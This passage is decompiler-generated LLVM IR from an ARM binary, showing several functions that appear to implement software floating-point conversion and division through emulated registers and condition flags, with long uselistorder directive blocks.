  store i32 %v9_15570, i32* @r6, align 4
  ret i32 %v10_156fc29

bb52:                                             ; preds = %bb50
  %v1_15704 = or i32 %v2_156f0, 1048576
  store i32 %v1_15704, i32* %r0.global-to-local, align 4
  store i32 0, i32* @lr, align 4
  %v1_1570c = add i32 %v5_156f4, -1
  store i32 %v1_1570c, i32* @r4, align 4
  ret i32 %v1_15704

; uselistorder directives
  uselistorder i32 %v5_156f4, { 4, 1, 0, 6, 3, 5, 2, 7 }
  uselistorder i32 %v4_156f4, { 2, 1, 0 }
  uselistorder i32 %v2_156f0, { 1, 0, 2 }
  uselistorder i32 %v1_156d4, { 2, 0, 1 }
  uselistorder i32 %v0_156d0, { 1, 0 }
  uselistorder i1 %v7_156c4, { 1, 0 }
  uselistorder i1 %v1_156a4, { 1, 0 }
  uselistorder i32 %v6_1569c, { 0, 2, 1, 3 }
  uselistorder i32 %v0_156a4, { 1, 0, 2 }
  uselistorder i32 %v3_15684, { 1, 0, 2 }
  uselistorder i32 %v5_15680, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v3_15680, { 1, 0 }
  uselistorder i1 %v3_15678, { 1, 0 }
  uselistorder i32 %v5_1566c, { 1, 0, 2, 3 }
  uselistorder i32 %v3_1566c, { 1, 0 }
  uselistorder i1 %v3_15664, { 1, 0 }
  uselistorder i32 %v2_15664, { 1, 0, 2 }
  uselistorder i32 %v5_15658, { 2, 1, 0, 3 }
  uselistorder i32 %v3_15658, { 1, 0 }
  uselistorder i1 %v3_15650, { 1, 0 }
  uselistorder i32 %v2_15650, { 1, 0, 2 }
  uselistorder i32 %v5_15644, { 2, 1, 0 }
  uselistorder i32 %v2_15640, { 1, 2, 0 }
  uselistorder i32 %v2_15630, { 0, 2, 1 }
  uselistorder i32 %v5_15628, { 1, 0 }
  uselistorder i32 %v2_15624, { 1, 2, 0 }
  uselistorder i32 %v2_15618, { 1, 0, 2 }
  uselistorder i32 %v2_1560c, { 1, 0, 2 }
  uselistorder i32 %v2_155fc, { 1, 0, 2 }
  uselistorder i32 %v2_155f0, { 0, 2, 1 }
  uselistorder i32 %v2_155e0, { 1, 0, 2 }
  uselistorder i32 %v6_155d8, { 1, 0, 2, 3 }
  uselistorder i32 %v6_155d4, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v6_155cc, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v3_155c8, { 2, 3, 4, 1, 0 }
  uselistorder i32 %v3_155c4, { 2, 3, 4, 0, 1 }
  uselistorder i32 %v3_155c0, { 3, 2, 0, 1 }
  uselistorder i32 %v3_155bc, { 3, 4, 2, 1, 0 }
  uselistorder i32 %v1_155ac, { 1, 0, 2 }
  uselistorder i32 %v1_155a8, { 1, 0, 2 }
  uselistorder i32 %v6_1559c, { 0, 2, 1, 3 }
  uselistorder i32 %v6_15598, { 0, 2, 1, 3 }
  uselistorder i32 %v1_15598, { 5, 2, 3, 4, 1, 0 }
  uselistorder i32 %v2_15594, { 1, 0 }
  uselistorder i32 %v2_15590, { 3, 2, 0, 1, 4 }
  uselistorder i32 %v6_15580, { 2, 1, 0 }
  uselistorder i32 %v5_1557c, { 2, 1, 0 }
  uselistorder i32 %v9_15570, { 1, 0 }
  uselistorder i32 %v6_15570, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 4, 1, 5, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 2, 4, 5, 6, 7, 8, 9, 1, 10, 0 }
  uselistorder i32 32768, { 5, 6, 7, 8, 9, 10, 11, 12, 4, 3, 2, 1, 0, 13 }
  uselistorder i32 65536, { 2, 0, 3, 65, 4, 66, 1, 5, 6, 7, 8, 67, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 25, 24, 30, 26, 31, 27, 32, 28, 33, 29, 34, 35, 36, 40, 37, 41, 38, 42, 39, 43, 45, 44, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 64, 63, 68 }
  uselistorder i32* @sl, { 52, 53, 5, 6, 7, 8, 11, 9, 10, 12, 13, 14, 15, 16, 17, 18, 3, 4, 19, 20, 0, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 54, 55, 56, 57, 2, 58, 59, 60, 61, 62, 63, 64, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 65, 66, 67, 68, 69, 70, 71, 1, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81 }
  uselistorder i32* @sb, { 30, 31, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 1, 2, 15, 16, 17, 18, 19, 20, 21, 22, 23, 32, 33, 34, 35, 36, 37, 38, 39, 40, 24, 25, 26, 27, 28, 29, 41, 42, 43, 44, 45, 46, 0, 47 }
  uselistorder i32* @r8, { 38, 39, 13, 14, 15, 16, 17, 18, 19, 3, 4, 5, 20, 21, 22, 0, 23, 24, 25, 26, 27, 1, 28, 29, 30, 31, 40, 41, 42, 43, 44, 45, 46, 47, 97, 98, 8, 9, 10, 11, 12, 58, 32, 33, 34, 35, 36, 37, 48, 49, 50, 51, 52, 53, 6, 7, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 2, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 54, 55, 56, 57, 93, 94, 95, 96 }
  uselistorder i32* @r7, { 79, 80, 39, 41, 42, 40, 43, 44, 45, 46, 47, 48, 7, 8, 9, 10, 11, 12, 13, 1, 49, 51, 50, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 81, 82, 83, 84, 85, 86, 3, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 127, 14, 15, 2, 16, 17, 20, 21, 22, 23, 24, 25, 26, 27, 28, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 97, 98, 99, 100, 29, 30, 31, 32, 116, 4, 117, 118, 5, 6, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 0, 18, 19, 125, 126, 38, 112, 113, 114, 115, 119, 120, 121, 122, 123, 124, 33, 34, 35, 36, 37 }
  uselistorder i32 %arg4, { 1, 2, 0, 3 }
  uselistorder i32 %arg3, { 0, 2, 3, 1, 4 }
  uselistorder i32 %arg2, { 1, 2, 0, 3, 4 }
  uselistorder i32 %arg1, { 0, 2, 3, 1, 4 }
  uselistorder label %bb50, { 1, 0 }
  uselistorder label %dec_label_pc_156e4, { 1, 0 }
  uselistorder label %._crit_edge, { 1, 0 }
  uselistorder label %bb47, { 1, 0 }
  uselistorder label %dec_label_pc_156b0, { 1, 0 }
  uselistorder label %bb45, { 1, 0 }
  uselistorder label %.thread1, { 3, 2, 1, 0 }
}

define i32 @function_15710(i32 %arg1) local_unnamed_addr {
dec_label_pc_15710:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %v0_15710 = load i1, i1* @cpsr_z, align 1
  %v1_15710 = load i1, i1* @cpsr_n, align 1
  %v2_15710 = load i1, i1* @cpsr_v, align 1
  %v3_15710 = xor i1 %v1_15710, %v2_15710
  %v4_15710 = or i1 %v0_15710, %v3_15710
  br i1 %v4_15710, label %dec_label_pc_15714, label %dec_label_pc_15878

dec_label_pc_15714:                               ; preds = %dec_label_pc_15710
  %v0_15714 = load i32, i32* @r4, align 4
  %v4_15714 = add i32 %v0_15714, 54
  %v6_15714 = sub i32 0, %v0_15714
  %v7_15714 = and i32 %v4_15714, %v6_15714
  %v8_15714 = icmp slt i32 %v7_15714, 0
  store i1 %v8_15714, i1* @cpsr_v, align 1
  %v9_15714 = icmp slt i32 %v4_15714, 0
  store i1 %v9_15714, i1* @cpsr_n, align 1
  %v10_15714 = icmp eq i32 %v4_15714, 0
  store i1 %v10_15714, i1* @cpsr_z, align 1
  %v7_15718 = icmp sgt i32 %v0_15714, -54
  br i1 %v7_15718, label %bb6, label %bb

bb:                                               ; preds = %dec_label_pc_15714
  store i32 0, i32* @r1, align 4
  %v8_1571c = load i32, i32* %r0.global-to-local, align 4
  %v9_1571c = and i32 %v8_1571c, -2147483648
  store i32 %v9_1571c, i32* %r0.global-to-local, align 4
  store i32 %tmp4, i32* @r4, align 4
  store i32 %tmp3, i32* @r5, align 4
  store i32 %tmp2, i32* @r6, align 4
  ret i32 %v9_1571c

bb6:                                              ; preds = %dec_label_pc_15714
  %v1_15724 = sub i32 0, %v0_15714
  %v2_15728 = sub i32 -32, %v0_15714
  %v4_15728 = add i32 %v0_15714, 31
  %v5_15728 = and i32 %v4_15728, %v1_15724
  %v6_15728 = icmp slt i32 %v5_15728, 0
  store i1 %v6_15728, i1* @cpsr_v, align 1
  %v6_1572c = icmp slt i32 %v1_15724, 32
  br i1 %v6_1572c, label %dec_label_pc_15730, label %dec_label_pc_15794

dec_label_pc_15730:                               ; preds = %bb6
  %v1_15730 = add i32 %v2_15728, 12
  %v8_15734 = icmp sgt i32 %v1_15730, 0
  br i1 %v8_15734, label %dec_label_pc_15768, label %dec_label_pc_15738

dec_label_pc_15738:                               ; preds = %dec_label_pc_15730
  %v1_15738 = add i32 %v2_15728, 32
  %v1_1573c = sub i32 0, %v2_15728
  %v0_15740 = load i32, i32* @r1, align 4
  %v6_15740 = shl i32 %v0_15740, %v1_1573c
  %v2_15744 = add i32 %v2_15728, 31
  %v3_15744 = shl i32 1, %v2_15744
  %v6_15744 = lshr i32 %v0_15740, %v1_15738
  %v1_15748 = load i32, i32* %r0.global-to-local, align 4
  %v7_15748 = shl i32 %v1_15748, %v1_1573c
  %v8_15748 = or i32 %v7_15748, %v6_15744
  %v1_1574c = and i32 %v1_15748, -2147483648
  %tmp = bitcast i32 %v1_15748 to float
  %tmp13 = call float @fabsf(float %tmp)
  %v1_15750 = bitcast float %tmp13 to i32
  %tmp14 = icmp slt i32 %v6_15740, 0
  %v4_15754 = zext i1 %tmp14 to i32
  %v5_15754 = add i32 %v8_15748, %v4_15754
  store i32 %v5_15754, i32* @r1, align 4
  %v5_15758 = and i32 %v1_15750, %v3_15744
  %v6_15758 = icmp ne i32 %v5_15758, 0
  %v7_15758 = lshr i32 %v1_15750, %v1_15738
  %v9_15758 = add i32 %v7_15758, %v1_1574c
  %v10_15758 = zext i1 %v6_15758 to i32
  %v11_15758 = add i32 %v9_15758, %v10_15758
  store i32 %v11_15758, i32* %r0.global-to-local, align 4
  %v19_15758 = add i32 %v11_15758, %v10_15758
  %v20_15758 = xor i32 %v19_15758, %v1_15748
  %v21_15758 = xor i32 %v19_15758, %v7_15758
  %v22_15758 = and i32 %v20_15758, %v21_15758
  %v23_15758 = icmp slt i32 %v22_15758, 0
  store i1 %v23_15758, i1* @cpsr_v, align 1
  %v0_1575c = load i32, i32* @lr, align 4
  %v3_1575c = mul i32 %v6_15740, 2
  %v4_1575c = or i32 %v0_1575c, %v3_1575c
  %v5_1575c = icmp slt i32 %v4_1575c, 0
  store i1 %v5_1575c, i1* @cpsr_n, align 1
  %v6_1575c = icmp eq i32 %v4_1575c, 0
  store i1 %v6_1575c, i1* @cpsr_z, align 1
  br i1 %v6_1575c, label %bb7, label %bb8

bb7:                                              ; preds = %dec_label_pc_15738
  %tmp15 = sext i1 %tmp14 to i32
  %v6_15760 = add nsw i32 %tmp15, -1
  %v7_15760 = and i32 %v5_15754, %v6_15760
  store i32 %v7_15760, i32* @r1, align 4
  br label %bb8

bb8:                                              ; preds = %dec_label_pc_15738, %bb7
  store i32 %tmp4, i32* @r4, align 4
  store i32 %tmp3, i32* @r5, align 4
  store i32 %tmp2, i32* @r6, align 4
  ret i32 %v11_15758

dec_label_pc_15768:                               ; preds = %dec_label_pc_15730
  %v1_15768 = sub i32 0, %v2_15728
  %v1_1576c = add i32 %v2_15728, 32
  %v0_15770 = load i32, i32* @r1, align 4
  %v6_15770 = shl i32 %v0_15770, %v1_15768
  %v6_15774 = lshr i32 %v0_15770, %v1_1576c
  %v1_15778 = load i32, i32* %r0.global-to-local, align 4
  %v7_15778 = shl i32 %v1_15778, %v1_15768
  %v8_15778 = or i32 %v7_15778, %v6_15774
  %v1_1577c = and i32 %v1_15778, -2147483648
  %tmp16 = icmp slt i32 %v6_15770, 0
  %v4_15780 = zext i1 %tmp16 to i32
  %v5_15780 = add i32 %v8_15778, %v4_15780
  store i32 %v5_15780, i32* @r1, align 4
  %v6_15780 = icmp ult i32 %v5_15780, %v8_15778
  %v2_15784 = zext i1 %v6_15780 to i32
  %v3_15784 = or i32 %v2_15784, %v1_1577c
  store i32 %v3_15784, i32* %r0.global-to-local, align 4
  %v9_15784 = add nsw i32 %v3_15784, %v2_15784
  %v10_15784 = sub i32 0, %v1_15778
  %v11_15784 = and i32 %v9_15784, %v10_15784
  %v12_15784 = icmp slt i32 %v11_15784, 0
  store i1 %v12_15784, i1* @cpsr_v, align 1
  %v0_15788 = load i32, i32* @lr, align 4
  %v3_15788 = mul i32 %v6_15770, 2
  %v4_15788 = or i32 %v0_15788, %v3_15788
  %v5_15788 = icmp slt i32 %v4_15788, 0
  store i1 %v5_15788, i1* @cpsr_n, align 1
  %v6_15788 = icmp eq i32 %v4_15788, 0
  store i1 %v6_15788, i1* @cpsr_z, align 1
  br i1 %v6_15788, label %bb9, label %bb10

bb9:                                              ; preds = %dec_label_pc_15768
  %tmp17 = sext i1 %tmp16 to i32
  %v6_1578c = add nsw i32 %tmp17, -1
  %v7_1578c = and i32 %v5_15780, %v6_1578c
  store i32 %v7_1578c, i32* @r1, align 4
  br label %bb10

bb10:                                             ; preds = %dec_label_pc_15768, %bb9
  store i32 %tmp4, i32* @r4, align 4
  store i32 %tmp3, i32* @r5, align 4
  store i32 %tmp2, i32* @r6, align 4
  ret i32 %v3_15784

dec_label_pc_15794:                               ; preds = %bb6
  %v1_15794 = sub i32 32, %v2_15728
  %v0_15798 = load i32, i32* @lr, align 4
  %v1_15798 = load i32, i32* @r1, align 4
  %v7_15798 = shl i32 %v1_15798, %v1_15794
  %v8_15798 = or i32 %v7_15798, %v0_15798
  %v6_1579c = lshr i32 %v1_15798, %v2_15728
  %v1_157a0 = load i32, i32* %r0.global-to-local, align 4
  %v7_157a0 = shl i32 %v1_157a0, %v1_15794
  %v8_157a0 = or i32 %v7_157a0, %v6_1579c
  %v6_157a4 = lshr i32 %v1_157a0, %v2_15728
  %v1_157a8 = and i32 %v1_157a0, -2147483648
  store i32 %v1_157a8, i32* %r0.global-to-local, align 4
  %v7_157ac = lshr i32 %v1_157a8, %v2_15728
  %v8_157ac = sub i32 -1, %v7_157ac
  %v9_157ac = and i32 %v6_157a4, %v8_157ac
  %tmp18 = icmp slt i32 %v8_157a0, 0
  %v4_157b0 = zext i1 %tmp18 to i32
  %v5_157b0 = add i32 %v4_157b0, %v9_157ac
  store i32 %v5_157b0, i32* @r1, align 4
  %v3_157b4 = mul i32 %v8_157a0, 2
  %v4_157b4 = or i32 %v8_15798, %v3_157b4
  %v5_157b4 = icmp slt i32 %v4_157b4, 0
  store i1 %v5_157b4, i1* @cpsr_n, align 1
  %v6_157b4 = icmp eq i32 %v4_157b4, 0
  store i1 %v6_157b4, i1* @cpsr_z, align 1
  br i1 %v6_157b4, label %bb11, label %bb12

bb11:                                             ; preds = %dec_label_pc_15794
  %tmp19 = sext i1 %tmp18 to i32
  %v6_157b8 = add nsw i32 %tmp19, -1
  %v7_157b8 = and i32 %v5_157b0, %v6_157b8
  store i32 %v7_157b8, i32* @r1, align 4
  br label %bb12

bb12:                                             ; preds = %dec_label_pc_15794, %bb11
  store i32 %tmp4, i32* @r4, align 4
  store i32 %tmp3, i32* @r5, align 4
  store i32 %tmp2, i32* @r6, align 4
  ret i32 %v1_157a8

dec_label_pc_15878:                               ; preds = %dec_label_pc_15710
  %v0_15878 = load i32, i32* %r0.global-to-local, align 4
  %v1_15878 = and i32 %v0_15878, -2147483648
  %v1_15880 = or i32 %v1_15878, 2146435072
  store i32 %v1_15880, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 %tmp4, i32* @r4, align 4
  store i32 %tmp3, i32* @r5, align 4
  store i32 %tmp2, i32* @r6, align 4
  ret i32 %v1_15880

; uselistorder directives
  uselistorder i32 %v3_15784, { 2, 0, 1 }
  uselistorder i32 %v8_15778, { 1, 0 }
  uselistorder i32 %v1_15768, { 1, 0 }
  uselistorder i32 %v11_15758, { 1, 0, 2 }
  uselistorder i32 %v1_15748, { 1, 0, 2, 3 }
  uselistorder i32 %v1_1573c, { 1, 0 }
  uselistorder i32 %v2_15728, { 5, 6, 7, 9, 0, 1, 2, 3, 4, 8 }
  uselistorder i32 %v1_15724, { 1, 0 }
  uselistorder i32 %v4_15714, { 1, 2, 0 }
  uselistorder i32 %v0_15714, { 3, 2, 1, 4, 0, 5 }
  uselistorder i32 %tmp4, { 4, 3, 2, 1, 0 }
  uselistorder i32 %tmp3, { 4, 3, 2, 1, 0 }
  uselistorder i32 %tmp2, { 4, 3, 2, 1, 0 }
  uselistorder i32* %r0.global-to-local, { 6, 0, 7, 1, 8, 2, 9, 3, 10, 4, 5 }
  uselistorder i32 12, { 41, 42, 29, 30, 31, 0, 32, 5, 33, 17, 10, 11, 3, 34, 12, 8, 66, 67, 68, 69, 70, 71, 9, 72, 73, 74, 75, 76, 77, 13, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 14, 18, 24, 65, 57, 58, 59, 1, 19, 60, 6, 61, 7, 20, 2, 62, 15, 35, 36, 37, 38, 78, 4, 39, 56, 63, 64, 16, 23, 21, 22, 25, 26, 27, 28, 40 }
  uselistorder i32 -32, { 2, 1, 3, 4, 5, 6, 10, 7, 11, 12, 8, 0, 9 }
  uselistorder i32 54, { 1, 0 }
  uselistorder label %bb12, { 1, 0 }
  uselistorder label %bb10, { 1, 0 }
  uselistorder label %bb8, { 1, 0 }
}

define i32 @function_1588c(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1588c:
  %v1_15890 = or i32 %arg1, 2146959360
  store i32 %arg2, i32* @r4, align 4
  ret i32 %v1_15890
}

define i32 @function_15898(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_15898:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_15898 = load i32, i32* @r4, align 4
  store i32 %v3_15898, i32* %stack_var_-16, align 4
  %v6_15898 = load i32, i32* @r5, align 4
  %v9_15898 = load i32, i32* @r6, align 4
  store i32 2047, i32* @ip, align 4
  %v1_158a4 = load i32, i32* %r0.global-to-local, align 4
  %v4_158a4 = udiv i32 %v1_158a4, 1048576
  %v5_158a4 = urem i32 %v4_158a4, 2048
  store i32 %v5_158a4, i32* @r4, align 4
  %v6_158a4 = icmp eq i32 %v5_158a4, 0
  br i1 %v6_158a4, label %dec_label_pc_15898..thread2_crit_edge, label %bb

dec_label_pc_15898..thread2_crit_edge:            ; preds = %dec_label_pc_15898
  %.pre150 = udiv i32 %arg3, 1048576
  br label %.thread2

bb:                                               ; preds = %dec_label_pc_15898
  %v5_158a8 = udiv i32 %arg3, 1048576
  %v6_158a8 = urem i32 %v5_158a8, 2048
  store i32 %v6_158a8, i32* %r5.global-to-local, align 4
  %v7_158a8 = icmp eq i32 %v6_158a8, 0
  br i1 %v7_158a8, label %.thread1, label %bb92

.thread1:                                         ; preds = %bb
  br label %dec_label_pc_15a2c

bb92:                                             ; preds = %bb
  %v5_158ac = icmp eq i32 %v5_158a4, 2047
  br i1 %v5_158ac, label %.thread2, label %bb93

.thread2:                                         ; preds = %dec_label_pc_15898..thread2_crit_edge, %bb92
  %.pre148.pre-phi = phi i32 [ %.pre150, %dec_label_pc_15898..thread2_crit_edge ], [ %v5_158a8, %bb92 ]
  br label %dec_label_pc_15a2c

bb93:                                             ; preds = %bb92
  %v5_158b0 = icmp eq i32 %v6_158a8, 2047
  br i1 %v5_158b0, label %dec_label_pc_15a2c, label %dec_label_pc_158b8

dec_label_pc_158b8:                               ; preds = %bb93
  %v2_158b8 = sub nsw i32 %v5_158a4, %v6_158a8
  store i32 %v2_158b8, i32* %r4.global-to-local, align 4
  %v2_158bc = xor i32 %v1_158a4, %arg3
  %v4_158c0 = mul i32 %arg3, 4096
  %v5_158c0 = or i32 %v4_158c0, %arg4
  store i32 %v5_158c0, i32* %r5.global-to-local, align 4
  %v7_158c0 = icmp eq i32 %v5_158c0, 0
  %v3_158c4 = mul i32 %v1_158a4, 4096
  store i32 %v3_158c4, i32* %r0.global-to-local, align 4
  br i1 %v7_158c0, label %dec_label_pc_159fc, label %dec_label_pc_158cc

dec_label_pc_158cc:                               ; preds = %dec_label_pc_158b8
  %tmp94 = mul i32 %arg3, 256
  %v4_158d4 = and i32 %tmp94, 268435200
  %v4_158d8 = udiv i32 %arg4, 16777216
  %v5_158d4 = or i32 %v4_158d8, %v4_158d4
  %v5_158d8 = or i32 %v5_158d4, 268435456
  store i32 %v5_158d8, i32* %r2.global-to-local, align 4
  %v3_158dc = mul i32 %arg4, 256
  store i32 %v3_158dc, i32* %r3.global-to-local, align 4
  %tmp95 = mul i32 %v1_158a4, 256
  %v4_158e0 = and i32 %tmp95, 268435200
  %v1_158e4 = load i32, i32* @r1, align 4
  %v4_158e4 = udiv i32 %v1_158e4, 16777216
  %v5_158e0 = or i32 %v4_158e0, %v4_158e4
  %v5_158e4 = or i32 %v5_158e0, 268435456
  store i32 %v5_158e4, i32* %r5.global-to-local, align 4
  %v3_158e8 = mul i32 %v1_158e4, 256
  store i32 %v3_158e8, i32* %r6.global-to-local, align 4
  %v1_158ec = and i32 %v2_158bc, -2147483648
  store i32 %v1_158ec, i32* %r0.global-to-local, align 4
  %v3_158f0 = icmp uge i32 %v5_158e4, %v5_158d8
  %v9_158f0 = icmp eq i32 %v5_158e4, %v5_158d8
  br i1 %v9_158f0, label %bb96, label %bb97

bb96:                                             ; preds = %dec_label_pc_158cc
  %v4_158f4 = icmp uge i32 %v3_158e8, %v3_158dc
  br label %bb97

bb97:                                             ; preds = %dec_label_pc_158cc, %bb96
  %v1_158f8 = phi i1 [ %v3_158f0, %dec_label_pc_158cc ], [ %v4_158f4, %bb96 ]
  %v2_158f8 = add nsw i32 %v2_158b8, 253
  %v3_158f8 = zext i1 %v1_158f8 to i32
  %v4_158f8 = add nsw i32 %v2_158f8, %v3_158f8
  %v8_158f8 = icmp ule i32 %v4_158f8, %v2_158b8
  %v9_158f8 = icmp ugt i32 %v2_158b8, -254
  %v10_158f8 = select i1 %v1_158f8, i1 %v8_158f8, i1 %v9_158f8
  %v1_158fc = add nsw i32 %v4_158f8, 768
  store i32 %v1_158fc, i32* %r4.global-to-local, align 4
  br i1 %v10_158f8, label %dec_label_pc_1590c, label %dec_label_pc_15904

dec_label_pc_15904:                               ; preds = %bb97
  %v3_15904 = udiv i32 %v5_158d8, 2
  store i32 %v3_15904, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1590c

dec_label_pc_1590c:                               ; preds = %bb97, %dec_label_pc_15904
  %v0_15914 = phi i32 [ %v5_158d8, %bb97 ], [ %v3_15904, %dec_label_pc_15904 ]
  %v0_15918 = phi i32 [ %v3_158dc, %bb97 ], [ 0, %dec_label_pc_15904 ]
  %v2_1590c = sub i32 %v3_158e8, %v0_15918
  store i32 %v2_1590c, i32* %r6.global-to-local, align 4
  %v3_1590c = icmp uge i32 %v3_158e8, %v0_15918
  %v3_15910 = icmp eq i1 %v3_1590c, false
  %v4_15910 = sub nsw i32 %v5_158e4, %v0_15914
  %v6_15910 = sext i1 %v3_15910 to i32
  %v7_15910 = add nsw i32 %v6_15910, %v4_15910
  store i32 %v7_15910, i32* %r5.global-to-local, align 4
  %v3_15914 = udiv i32 %v0_15914, 2
  store i32 %v3_15914, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_15924.outer

dec_label_pc_15924.outer:                         ; preds = %dec_label_pc_159bc, %dec_label_pc_1590c
  %v1_159d0.ph = phi i32 [ %v2_159bc, %dec_label_pc_159bc ], [ %v1_158ec, %dec_label_pc_1590c ]
  %v0_15928.ph = phi i32 [ %v5_15998, %dec_label_pc_159bc ], [ %v7_15910, %dec_label_pc_1590c ]
  %v1_1592c.ph = phi i32 [ %v3_1599c, %dec_label_pc_159bc ], [ %v2_1590c, %dec_label_pc_1590c ]
  %v5_159a417.ph = phi i32 [ %v5_159a4, %dec_label_pc_159bc ], [ %v3_15914, %dec_label_pc_1590c ]
  %v3_159a813.ph = phi i32 [ %v3_159a8, %dec_label_pc_159bc ], [ 0, %dec_label_pc_1590c ]
  %storemerge136 = phi i32 [ 0, %dec_label_pc_159bc ], [ 1048576, %dec_label_pc_1590c ]
  %storemerge = phi i32 [ -2147483648, %dec_label_pc_159bc ], [ 524288, %dec_label_pc_1590c ]
  store i32 %storemerge136, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_15924

dec_label_pc_15924:                               ; preds = %dec_label_pc_15924.outer, %dec_label_pc_15994
  %v1_1598859 = phi i32 [ %v2_159d0, %dec_label_pc_15994 ], [ %storemerge136, %dec_label_pc_15924.outer ]
  %v1_15934 = phi i32 [ %v1_1593432, %dec_label_pc_15994 ], [ %storemerge136, %dec_label_pc_15924.outer ]
  %v1_1595041 = phi i32 [ %v1_1595043, %dec_label_pc_15994 ], [ %storemerge136, %dec_label_pc_15924.outer ]
  %v1_1596c50 = phi i32 [ %v1_1596c52, %dec_label_pc_15994 ], [ %storemerge136, %dec_label_pc_15924.outer ]
  %v0_159ac = phi i32 [ %v3_159ac, %dec_label_pc_15994 ], [ %storemerge, %dec_label_pc_15924.outer ]
  %v0_15928 = phi i32 [ %v5_15998, %dec_label_pc_15994 ], [ %v0_15928.ph, %dec_label_pc_15924.outer ]
  %v1_1592c = phi i32 [ %v3_1599c, %dec_label_pc_15994 ], [ %v1_1592c.ph, %dec_label_pc_15924.outer ]
  %v5_159a417 = phi i32 [ %v5_159a4, %dec_label_pc_15994 ], [ %v5_159a417.ph, %dec_label_pc_15924.outer ]
  %v3_159a813 = phi i32 [ %v3_159a8, %dec_label_pc_15994 ], [ %v3_159a813.ph, %dec_label_pc_15924.outer ]
  %v3_15924 = icmp uge i32 %v1_1592c, %v3_159a813
  %v3_15928 = icmp eq i1 %v3_15924, false
  %v4_15928 = sub i32 %v0_15928, %v5_159a417
  %v6_15928 = sext i1 %v3_15928 to i32
  %v7_15928 = add i32 %v6_15928, %v4_15928
  %v8_15928 = zext i1 %v3_15928 to i32
  %v9_15928 = sub i32 %v7_15928, %v8_15928
  %v10_15928 = icmp ult i32 %v0_15928, %v9_15928
  %v11_15928 = icmp ne i32 %v5_159a417, -1
  %v12_15928 = or i1 %v11_15928, %v10_15928
  %v13_15928 = icmp ult i32 %v0_15928, %v5_159a417
  %v14_15928 = select i1 %v3_15928, i1 %v12_15928, i1 %v13_15928
  br i1 %v14_15928, label %.thread4, label %bb98

bb98:                                             ; preds = %dec_label_pc_15924
  %v3_1592c = sub i32 %v1_1592c, %v3_159a813
  store i32 %v3_1592c, i32* %r6.global-to-local, align 4
  store i32 %v7_15928, i32* %r5.global-to-local, align 4
  %v3_15934 = or i32 %v1_15934, %v0_159ac
  store i32 %v3_15934, i32* %r1.global-to-local, align 4
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_15924, %bb98
  %v1_1598858 = phi i32 [ %v1_1598859, %dec_label_pc_15924 ], [ %v3_15934, %bb98 ]
  %v1_1593435 = phi i32 [ %v1_15934, %dec_label_pc_15924 ], [ %v3_15934, %bb98 ]
  %v1_15950 = phi i32 [ %v1_1595041, %dec_label_pc_15924 ], [ %v3_15934, %bb98 ]
  %v1_1596c49 = phi i32 [ %v1_1596c50, %dec_label_pc_15924 ], [ %v3_15934, %bb98 ]
  %v0_15944 = phi i32 [ %v0_15928, %dec_label_pc_15924 ], [ %v7_15928, %bb98 ]
  %v1_15948 = phi i32 [ %v1_1592c, %dec_label_pc_15924 ], [ %v3_1592c, %bb98 ]
  %v1_15938 = urem i32 %v5_159a417, 2
  %v2_15938 = icmp ne i32 %v1_15938, 0
  %v3_15938 = udiv i32 %v5_159a417, 2
  %v3_1593c = zext i1 %v2_15938 to i32
  %v6_1593c = zext i32 %v3_159a813 to i64
  %v7_1593c = sub i32 33, %v3_159a813
  %v8_1593c = zext i32 %v7_1593c to i64
  %v9_1593c = shl i64 %v6_1593c, %v8_1593c
  %v10_1593c = sub i32 32, %v3_159a813
  %v11_1593c = shl i32 %v3_1593c, %v10_1593c
  %v12_1593c = zext i32 %v11_1593c to i64
  %v14_1593c = or i64 %v12_1593c, %v9_1593c
  %v15_1593c = trunc i64 %v14_1593c to i32
  %v3_15940 = icmp uge i32 %v1_15948, %v15_1593c
  %v3_15944 = icmp eq i1 %v3_15940, false
  %v4_15944 = sub i32 %v0_15944, %v3_15938
